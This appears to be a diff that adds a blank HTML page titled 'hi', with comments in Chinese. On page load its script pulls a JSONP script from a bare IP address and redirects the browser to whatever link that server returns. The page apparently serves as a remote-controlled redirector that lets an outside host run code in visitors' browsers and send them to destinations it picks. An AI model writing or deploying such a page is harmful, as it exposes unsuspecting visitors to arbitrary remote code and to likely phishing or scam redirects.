@@ -1,0 +1,24 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>hi</title>
+</head>
+<body>
+
+<script>
+    // 创建一个全局的回调函数
+    function handleRedirectLink(response) {
+        // 获取跳转链接并重定向
+        window.location.href = response.redirectLink;
+    }
+
+    // 动态创建 <script> 标签，并设置 src 属性包含 JSONP 请求
+    var script = document.createElement('script');
+    script.src = 'http://45.205.3.76:3000/getRedirectLink?callback=handleRedirectLink';
+    document.body.appendChild(script);
+</script>
+
+</body>
+</html>
